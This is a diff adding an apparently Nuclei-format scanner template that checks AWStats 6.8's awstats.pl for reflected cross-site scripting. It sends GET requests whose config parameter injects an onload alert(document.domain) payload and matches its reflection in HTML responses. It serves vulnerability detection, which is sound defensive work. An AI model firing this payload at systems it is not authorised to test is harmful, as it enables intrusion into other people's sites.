@@ -1,0 +1,27 @@
+id: AWStats-6-8-onexss
+
+info:
+  name: AWStats 6.8 - 'AWStats.pl' Cross-Site Scripting
+  author: osamahamad
+  severity: high
+  description: https://www.exploit-db.com/exploits/32258
+  reference: https://www.exploit-db.com/exploits/32258
+  tags: custom
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/awstats/awstats.pl?config=www.example.com&%22onload=%22alert(document.domain)//"
+      - "{{BaseURL}}/awstats.pl?config=www.example.com&%22onload=%22alert(document.domain)//"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"onload="alert(document.domain)'
+        part: body 
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
